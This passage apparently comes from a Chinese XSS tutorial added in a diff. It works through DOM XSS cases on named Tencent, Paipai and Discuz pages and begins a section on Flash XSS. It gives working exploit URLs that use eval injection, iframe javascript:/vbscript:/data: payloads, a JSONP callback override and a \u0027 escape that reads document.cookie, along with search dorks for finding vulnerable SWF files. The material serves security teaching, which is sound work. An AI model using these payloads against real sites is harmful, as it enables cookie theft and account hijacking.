+<p>那么eval这句就是执行的 eval(‘this.key=”aaaa”;’)</p>
+<p><img src="10-4.webp" alt=""></p>
+<p>这样一来 , <code>this.key=&quot;aaaa&quot;;</code>这句就被执行了。</p>
+<p>如果这里我们把 key 换个写法呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; this.key=&quot;aaaa&quot;;</div><div class="line">&gt; this.key;alert(1);//=&quot;aaaa&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>如下图：</p>
+<p><img src="10-5.webp" alt=""></p>
+<p>那么是不是将会执行我们的<code>alert(1);</code>呢？</p>
+<p>根据上面内容，我们可以构造代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="10-6.webp" alt=""></p>
+<p>不知道看完上面的，有没有娃注意到，后面的 aaaa 不是也可以构造吗？</p>
+<p><code>this.key=&quot;aaaa&quot;;</code> 换为 <code>this.key=&quot;aaa&quot;;alert(1);//&quot;;</code></p>
+<p>确实是如此 :)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这个在IE下一样是可以的。</p>
+<p>但是这样在chrome下却不行。 原因其实上面一节教程也提到过。</p>
+<p>chrome会自动对<code>&quot;</code>, <code>&gt;</code>, <code>&lt;</code> 进行转换。</p>
+<p>因而</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; this.key=&quot;aaa&quot;;alert(1);//&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; this.key=&quot;aaa%22;alert(1);//&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>从而失效。</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>参照你们已经修复的类似文件即可。 <a href="http://kf.qq.com/wsearch.shtml" target="_blank" rel="external">http://kf.qq.com/wsearch.shtml</a> 的 <a href="http://kf.qq.com/js/wsearch.js" target="_blank" rel="external">http://kf.qq.com/js/wsearch.js</a></p>
+<p>本来上面这个文件也是存在漏洞的，估计这个位置已经被人报告给腾讯了，因而腾讯加了一次防御。我们看看腾讯的防御措施。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt; var getarg = function()&#123;</div><div class="line">	.... 省略相同部分...</div><div class="line">                eval(&apos;this.&apos; + arg[0] + &apos;=&quot;&apos; + HtmlAttributeEncode(arg[1]) + &apos;&quot;;&apos;);</div><div class="line">	.... 省略相同部分...</div><div class="line">    &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>也就是说，腾讯这里对后面的arg[1]进行了过滤。</p>
+<p>接着，这个问题又被再次报告了，因而前些时候，腾讯又进一步做了修复。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&gt; var getarg = function()&#123;</div><div class="line">	.... 省略相同部分...</div><div class="line">            if (arg[0] != null &amp;&amp; arg[1] != null &amp;&amp; (arg[0] == &apos;page&apos; || arg[0] == &apos;count&apos; || arg[0] == &apos;tag&apos; || arg[0] == &apos;key&apos; || arg[0] == &apos;total&apos;) )</div><div class="line">            &#123;</div><div class="line">                eval(&apos;this.&apos; + arg[0] + &apos;=&quot;&apos; + HtmlAttributeEncode(arg[1]) + &apos;&quot;;&apos;);</div><div class="line">             &#125;</div><div class="line">	.... 省略相同部分...</div><div class="line">    &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这一次，腾讯对 arg[0]进行了判断。</p>
+<p>哈，补了东墙，补西墙。 不过呢？补了这个wsearch.js文件，还有我们现在分析的这个(<a href="http://kf.qq.com/js/search_app.js)文件。" target="_blank" rel="external">http://kf.qq.com/js/search_app.js)文件。</a></p>
+</blockquote>
+<h2 id="11-Dom-Xss进阶-善变iframe"><a href="#11-Dom-Xss进阶-善变iframe" class="headerlink" title="11. Dom Xss进阶 [善变iframe]"></a>11. Dom Xss进阶 [善变iframe]</h2><p>DOM XSS</p>
+<blockquote>
+<p>有时候，输出还会出现在 <code>&lt;iframe src=&quot;[输出]&quot;&gt;&lt;/iframe&gt;</code> 。 iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=”[可控的url]”; 同样会导致XSS问题，来看看本例吧～</p>
+<h3 id="先来说说iframe的变化。"><a href="#先来说说iframe的变化。" class="headerlink" title="先来说说iframe的变化。"></a>先来说说iframe的变化。</h3><ul>
+<li>最好懂的，onload执行js: <code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>src 执行javascript代码: <code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>IE下vbscript执行代码: <code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下data协议执行代码: <code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>上面的变体: <code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下srcdoc属性: <code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+</ul>
+<h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><p>漏洞点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们先开调试工具，看看有没有可见的输出。</p>
+<p><img src="11-0.webp" alt=""></p>
+<p>可以看到，我们参数的aaaaaa被带入到了<code>&lt;iframe src=&quot;这里&quot;&gt;&lt;/iframe&gt;</code>。</p>
+<p>这样一来，就满足了我们的使用条件。</p>
+<p>我们试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>。。竟然没反应。我们来看看刚才的那个地方。</p>
+<p><img src="11-1.webp" alt=""></p>
+<p>可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。</p>
+<p>恩，看来就是这段代码导致的。</p>
+<p><img src="11-2.webp" alt=""></p>
+<p>一起看看这段代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&gt; function OpenFrame(url) &#123;</div><div class="line">	if (url.toLowerCase().indexOf(&apos;http://&apos;) != &apos;-1&apos; </div><div class="line">		|| url.toLowerCase().indexOf(&apos;https://&apos;) != &apos;-1&apos; </div><div class="line">		|| url.toLowerCase().indexOf(&apos;javascript:&apos;) != &apos;-1&apos;) // 过滤</div><div class="line">			return false;</div><div class="line">	document.getElementById(&quot;toolframe&quot;).src = url; // 造成XSS</div><div class="line">&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>而openFrame的url参数则来自于(无关代码省略)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt; ...</div><div class="line">var tool_url = getQueryStringValue(&quot;turl&quot;);</div><div class="line">...</div><div class="line">openFrame(tool_url);</div><div class="line">...</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。</p>
+<p>在IE下，我们可以使用vbscript来执行代码。 vbscript里 <code>&#39;</code> 单引号表示注释，类似JS里的<code>//</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(1)&apos;&amp;gid=yl&amp;cid=68&amp;from=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="11-3.webp" alt=""></p>
+<p>在chrome下，我们可以用data协议来执行JS。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&apos;&amp;gid=yl&amp;cid=68&amp;from=</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="11-4.webp" alt=""></p>
+</blockquote>
+<h2 id="12-Dom-Xss进阶-路径con"><a href="#12-Dom-Xss进阶-路径con" class="headerlink" title="12. Dom Xss进阶 [路径con]"></a>12. Dom Xss进阶 [路径con]</h2><p>DOM XSS</p>
+<blockquote>
+<p>一些程序员会动态的加载json数据，同域的时候，可以使用ajax；而有时候，数据所在域和当前页面所在域又不一致。所以需要跨域请求。跨域请求数据的手段中，有一种叫做jsonp。</p>
+<p>用代码表示的话，就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>某些时候，程序员会在调用外部数据的时候带上可控的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>如果这个id我们可控，将可能带来XSS问题。</p>
+<p>在扫描过程中，经常遇到下面的例子。【??? 怎么扫描,Bt5的，/pentest/web/ 目录下，也有几款xss扫描器,@gainover 开发中的扫描器</p>
+<p><img src="12-0.webp" alt=""></p>
+<p>如果这个地址是我们可控的话，一样会带来威胁。地址的可控可以分为3个层面。</p>
+<ul>
+<li><code>script src=&quot;完全可控&quot;</code>: 这种就简单了，直接将地址换为我们的JS地址</li>
+<li><code>script src=&quot;/path/xxx/[路径可控]/1.js&quot;</code>: 这种要利用的话，需要同域名下有可控的文件。可控文件又分为2种。<ul>
+<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
+<li>参数可控，利用可用的json接口。最终变为 <code>script src=&quot;/path/xxx/.../yyy/xx.json?callback=alert(1)&quot;</code></li>
+</ul>
+</li>
+<li><code>script src=&quot;/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]&quot;</code>: 与上一条的第2点类似，如果参数可控，且json的参数没有很好的过滤时。我们就有机可乘了。</li>
+</ul>
+<p>本文以拍拍网一处XSS为例，来描述以上可能性。</p>
+<p>扫描器扫到的点，见步骤1中的图。进一步，我们可以通过抓包的方式，看到页面在打开时，所加载的外部JS文件地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://sse1.paipai.com/comm_json?callback=commentListCallBack&amp;dtag=1&amp;ac=1&amp;cluster=1&amp;sellquality=0&amp;NewProp=&amp;Property=256&amp;PageNum=1&amp;PageSize=48&amp;OrderStyle=80&amp;Address=&amp;SaleType=1&amp;degree=1&amp;AuthType=2&amp;BeginPrice=&amp;EndPrice=&amp;KeyWord=2012%20%D0%C2&amp;OnlineState=2&amp;Paytype=4&amp;ranking=&amp;sClassid=&apos;aaaaaaaa&amp;t=1354854681</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们打开这个JSON，用扫描反射型的方式，可以测试出，</p>
+<p>callback, dtag 以及 ranking可控。但均无法使用&lt;, &gt;，也就是说，这个JSON接口本身是无XSS风险的。</p>
+<p>此外 dtag, 和 ranking 都在双引号里面，我们在后续无法进行利用，而callback则在最前面，比较好控制。</p>
+<p>我们可以想象下，如果我们可以让这个页面调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://sse1.paipai.com/comm_json?callback=alert(1);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>那么将会产生XSS。</p>
+<p>那么怎么让页面调用上面的情况呢？</p>
+<p>1 直接控制callback参数，但是从实际情况来看，我们此处无法直接控制它，【失败】</p>
+<p>2 将后面的参数, param=xxx修改为param=xxx&amp;callback=alert(1) ，从而覆盖前面的callback</p>
+<p>上面说到的第2种方案，似乎可行。但是实际上还是有问题的。</p>
+<p>譬如我们页面上的 type参数，对应着json的sclassid参数。</p>
+<p>我们访问以下地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://bag.paipai.com/search_list.shtml?type=&amp;callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>其实很明显上面这样是不行的。。因为 &amp; 本身就是参数分隔符。这样写type就为空了</p>
+<p>可能很快就有人想到另外一个写法：&amp; 写为 %26</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://bag.paipai.com/search_list.shtml?type=%26callback=alert(1);&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000&amp;keyword=&amp;PTAG=20058.13.13</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>很好，但是实际上，你会发现，访问的json接口的参数也还是原封不动的 %26，而不是所希望的 &amp;</p>
+<p><img src="12-1.webp" alt=""></p>
+<p>为了看看参数是怎么从页面，传递到了 comm_json 这个接口上的。我们定位到以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://static.paipaiimg.com/js/search.js?t=20121108</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>code:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&gt; function init() &#123;</div><div class="line">        var keyword = decodeURIComp($getQuery(&apos;keyword&apos;)),</div><div class="line">        type = $getQuery(&apos;type&apos;),</div><div class="line">        searchtype = $getQuery(&apos;searchtype&apos;);</div><div class="line">        option.keyword = keyword;</div><div class="line">        option.classId = type;</div><div class="line">        option.searchType = searchtype || option.searchType;</div><div class="line">        option.beginPrice = $getQuery(&apos;bp&apos;);</div><div class="line">        option.endPrice = $getQuery(&apos;ep&apos;);</div><div class="line">        option.NewProp = $getQuery(&apos;np&apos;) || $getQuery(&apos;newprop&apos;);</div><div class="line">        option.property = $getQuery(&apos;pro&apos;) || option.property;</div><div class="line">        option.cid = $getQuery(&apos;cid&apos;);</div><div class="line">        option.Paytype = $getQuery(&apos;pt&apos;) || option.Paytype;</div><div class="line">        option.hongbaoKeyword = $getQuery(&apos;hb&apos;);</div><div class="line">        option.conditionStatus = $getQuery(&apos;cs&apos;) || option.conditionStatus;</div><div class="line">        option.showType = $getQuery(&apos;show&apos;) || option.showType;</div><div class="line">        option.mode = $getQuery(&apos;mode&apos;) || option.mode;</div><div class="line">        option.address = decodeURIComp($getQuery(&apos;adr&apos;));</div><div class="line">        option.orderStyle = $getQuery(&apos;os&apos;) || option.orderStyle || 80;</div><div class="line">        option.hideKeyword = $getQuery(&apos;hkwd&apos;) == &quot;true&quot; ? true: false;</div><div class="line">        option.ptag.currentPage = $getQuery(&apos;ptag&apos;) || $getQuery(&apos;PTAG&apos;);</div><div class="line">        var pageIndex = $getQuery(&apos;pi&apos;),</div><div class="line">        pageSize = $getQuery(&apos;ps&apos;);</div><div class="line">        option.pageIndex = (pageIndex &amp;&amp; $isPInt(pageIndex)) ? pageIndex * 1: option.pageIndex;</div><div class="line">        option.pageSize = (pageSize &amp;&amp; $isPInt(pageSize)) ? pageSize * 1: option.pageSize;</div><div class="line">    &#125;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>在这个文件里，我们很容易的看出，当前页面参数和json参数的对应关系</p>
+<p><code>option.JSON参数=$getQuery(&quot;页面参数&quot;)</code></p>
+<p>一个函数让我眼前一亮啊，decodeURIComp。。也就是说，传入的keyword，会解码一次。</p>
+<p>也就是说，如果我们</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; keyword=%26callback=alert(1);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>decodeURIComp就会变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &amp;callback=alert(1);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>为了证明我们的想法：我们直接写利用代码。注意keyword=那一部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; http://bag.paipai.com/search_list.shtml?type=213280&amp;np=11&amp;pro=256&amp;searchtype=2&amp;cs=0010000</div><div class="line">&gt; &amp;keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void</div><div class="line">&gt; &amp;PTAG=20058.13.13</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="12-2.webp" alt=""></p>
+<p>抓包可以看到，被动态加载的keyword参数，我们在后面插入了一个callback，覆盖了前面的callback</p>
+<p><img src="12-3.webp" alt=""></p>
+<p>同样，看到返回的comm_json的内容</p>
+<p><img src="12-4.webp" alt=""></p>
+</blockquote>
+<h2 id="13-Dom-Xss实例-Discuz-X2-5"><a href="#13-Dom-Xss实例-Discuz-X2-5" class="headerlink" title="13. Dom Xss实例 [Discuz X2.5]"></a>13. Dom Xss实例 [Discuz X2.5]</h2><p>DOM XSS</p>
+<blockquote>
+<p>我们教程的DOM XSS就到这里了。最后再给大家送上一个实例。希望大家能够体会到：<strong>XSS的上下文非常重要，如何结合上下文，利用未过滤字符，合理的构造，才是成功的关键。</strong></p>
+<p>漏洞点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; http://www.discuz.net/connect.php?receive=yes&amp;mod=login</div><div class="line">&gt; &amp;op=callback&amp;referer=aaaaaaaaaaa</div><div class="line">&gt; &amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>可以看到我们的aaaaaaaaaa在源代码里有2处输出。</p>
+<p><img src="13-0.webp" alt=""></p>
+<p>看第2处，我们需要用双引号闭合，但是显然dz不会给我们这么明显的机会，被拦截了。</p>
+<p><img src="13-1.webp" alt=""></p>
+<p>我们把目光放在第一处，这一处很特殊，位于setTimeout函数的第一个参数里，setTimeout的第一个函数会将字符串作为脚本来执行。</p>
+<p>我们把这一部分代码提取出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&apos;http://www.discuz.net/./aaaaaaaaaaa&apos;;&quot;, 2000);&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们首先能想到的是闭合掉 单引号， 但是这里单引号已经被过滤了。</p>
+<p><img src="13-2.webp" alt=""></p>
+<p>那么是不是就没有办法了呢？我们可以看到<code>setTimeout</code>的第一个参数是字符串；我们前面的教程里说过一次，JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为<code>\u0027</code>或<code>\x27</code>。带着这个想法，我们可以试试<code>\</code>有没有被过滤。幸运的是，这里还真没过滤 <code>\</code></p>
+<p><img src="13-3.webp" alt=""></p>
+<p>接着我们就是构造代码了。</p>
+<p>首先写好代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&apos;http://www.discuz.net/./a&apos;;alert(document.cookie);a=&apos;&apos;;&quot;, 2000);&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>将里面的引号变为<code>\u0027</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&apos;http://www.discuz.net/./a\u0027;alert(document.cookie);a=\u0027&apos;;&quot;, 2000);&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>代入到URL里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; http://www.discuz.net/connect.php?receive=yes&amp;mod=login</div><div class="line">&gt; &amp;op=callback&amp;referer=a\u0027;alert(document.cookie);a=\u0027</div><div class="line">&gt; &amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>可以看到弹出了cookies。</p>
+<p><img src="13-4.webp" alt=""></p>
+<p>其实这里存在一个问题。 这段JS代码里，第一句是<code>location.href=&quot;某个地址&quot;;</code> 上面我们所演示的，是一个alert，暂停了location.href的发生。</p>
+<p>如果我们把 <code>alert(document.cookie);</code> 换成插入某个JS文件的脚本代码，就会出现问题。</p>
+<p>即：JS文件还没来得及加载，<code>location.href=&quot;某个地址&quot;;</code> 这句就会被执行，从而跳转到另外一个页面了，继而导致失效。</p>
+<p>所以这里，我们有必要改进下执行JS的办法。如下，</p>
+<p>我们可以直接让代码变成执行 <code>location.href=&quot;javascript:alert(document.cookie)&quot;;</code></p>
+<p><code>location.href=&#39;原来的字符串&#39;.替换(所有字符,&quot;新的字符&quot;);</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&apos;http://www.discuz.net/./a&apos;.replace(/.+/,/javascript:alert(document.cookie)/.source);//&apos;;&quot;, 2000);&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>同上，替换单引号,加号什么的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&apos;http://www.discuz.net/./a\u0027.replace(/.\u002b/,/javascript:alert(document.cookie)/.source);//&apos;;&quot;, 2000);&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>最后利用代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://www.discuz.net/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=a\u0027.replace(/.\u002b/,/javascript:alert(document.cookie)/.source);//&amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>可以看到，效果一样，这次就不会发生跳转从而导致加载JS失败咯。</p>
+<p><img src="13-5.webp" alt=""></p>
+</blockquote>
+<h1 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h1><h2 id="14-Flash-Xss入门-navigateToURL"><a href="#14-Flash-Xss入门-navigateToURL" class="headerlink" title="14. Flash Xss入门 [navigateToURL]"></a>14. Flash Xss入门 [navigateToURL]</h2><p>Flash XSS, 反射型XSS, Flash应用安全</p>
+<blockquote>
+<p>接下来，我们将讲解Flash Xss。由于乌云及社会各界的白帽子的上报，腾讯目前已经对绝大多数可能存在问题的Flash进行了修复。使得我在寻找真实案例时着实麻烦了不少。但是为了使得本教程足够完善和系统，我还是很艰难的找出了一些可以参考的例子。例子本身危害可能不大，但是希望能够借助例子给新手们描述清楚比较基本的东西。</p>
+<p>Flash的actionscript脚本目前网络上存在2种版本，即2.0与3.0，本次教程先以as3.0为例。同时教程还会在如何使用搜索引擎搜索，如何查找关键词及构造利用代码方面进行详细的讲解。</p>
+<p>首先，第一步，我们需要找到存在缺陷的FLASH文件。如何找到这类文件呢？最好的办法，当然是GOOGLE搜索。但是其实很多人是不太会用搜索引擎。或者知道怎么用，但是不知道该如何搜索关键词。因而教程的开始，我们来说一说，如何搜索关键词。</p>
+<p>基本语句肯定是 <code>site:qq.com filetype:swf</code>, 意思是，限定域名为qq.com 文件类型为FLASH文件。</p>
+<p>显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。这里我列举一些寻找关键词的方式。</p>
+<ul>
+<li>已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等</li>
+<li>多媒体功能的FLASH文件名，如：upload，player, music, video等</li>
+<li>调用的外部配置或数据文件后缀，如: xml, php 等</li>
+<li>前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等</li>
+</ul>
+<p>结合以上经验，本例使用其中第三条, 我们搜索： <code>site:qq.com filetype:swf inurl:xml</code></p>
+<p>可以找到这个FLASH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://imgcache.qq.com/liveportal_v1/swf/carousel.swf?v=20101111&amp;dp=http://v.qq.com/doco/pic.xml</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>如果你对FLASH有一定了解或者你天资聪慧的话，通过以上地址，你或许能猜到这个FLASH会调用<code>http://v.qq.com/doco/pic.xml</code>这个XML文件的数据，为了看看是什么数据，我们可以使用抓包软件【这里我使用的是charles web proxy】来看看。</p>
+<p><img src="14-0.webp" alt=""></p>
+<p>我们看看<code>http://v.qq.com/doco/pic.xml</code>的内容，对应着FLASH来看。</p>
+<p><img src="14-1.webp" alt=""></p>
+<p>这里我们重点关注的是xml里的<code>&lt;link&gt;</code>结点。也就是当我们点击图片时，会跳转到link所指向的地址。</p>
+<p>接着我们先说下基础知识。要实现上面点击图片，打开链接的功能，在FLASH里通常以以下代码来实现的。</p>
+<p>当图片点击时执行 函数A</p>
+<p>函数A内容如下：</p>
